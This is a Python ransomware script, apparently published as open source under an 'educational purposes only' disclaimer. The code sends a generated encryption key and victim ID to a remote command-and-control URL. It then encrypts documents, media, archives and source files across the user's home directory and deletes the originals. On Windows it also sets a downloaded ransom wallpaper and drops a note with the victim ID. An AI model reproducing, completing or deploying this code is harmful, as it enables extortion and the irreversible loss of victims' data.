import os, random, sys, string
from cryptography.fernet import Fernet
import requests
import ctypes
# Written and made open-source by https://github.com/OpenWorldOperations/WannaPy
# DO NOT USE ILLEGALLY. FOR EDUCATIONAL PURPOSES ONLY. YOU HAVE BEEN WARNED!
# Generate a unique identifier and encryption key 
uuid = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(random.randint(15, 30)))
key = Fernet.generate_key()
# Do a GET request to an API. The API writes the fields to your database.
candc = requests.get("https://examplesite/api.php?uuid="+uuid+"&key="+key)
# If the HTTP response isn't a success. Then exit the program and don't encrypt the victims files.
# (No point encrypting users files, if you can't recieve the decryption key.)
if candc.status_code != 200:
    print(candc.status_code)
    sys.exit()
# If Windows or Linux. Then set a path location to crawl for files.
if os.name == 'nt':
    username = str(os.getenv('username'))
    path = 'C:/Users/' + username
    pass
elif os.name == 'posix':
    path = '/home/user/'
    pass

files = []
# Extentions for which files to encrypt.
extensions = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h", ".gif", ".txt", ".py", ".pyc", ".jar", ".sql", ".bundle",".sqlite3", ".html", ".php", ".log", ".bak", ".deb", ".exe"]
# Find the path(s) for the extensions in the array.
for r, d, f in os.walk(path):
    for file in f:
        if file.endswith(tuple(extensions)):
            files.append(os.path.join(r, file))
        else:
            pass
# For every file. Read the file data, encrypt it. Then write it.
for f in files:
    print(f)
    # Reads the files bytes
    try:
        with open(f, 'rb') as fileByte:
            data = fileByte.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        # Write the encrypted file using the bytes and add .encrypted to the end of the file. In order for the decryptor to find which files are encrypted.
        with open(f+'.encrypted', 'wb') as fileByte:
            fileByte.write(encrypted)
            fileByte.close()
            # Remove the file, when the new encrypted file is written.
            os.remove(f)
    # If there are any errors (Permissions denied etc.) skip to the next file.
    except Exception as e:
        print(e)
        pass

if os.name == 'nt':
    # Download the background image, then set the ransom background after files have been encrypted.
    img_data = requests.get("https://i.postimg.cc/j5hNmKWj/ButWhie.png").content
    with open('C:/Users/' + username + '/Pictures/background.png', 'wb') as handler:
        handler.write(img_data)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, 'C:/Users/' + username + '/Pictures/background.png' , 0)
    text_file = open('C:/Users/' + username + '/Desktop/ButWhy.txt', "w")
    # Write instructions for how the victim can recover their encrypted files.
    text_file.write("UUID: "+uuid+"\n^DO NOT LOSE THIS!")
    text_file.close()
    pass
elif os.name == 'posix':
    pass

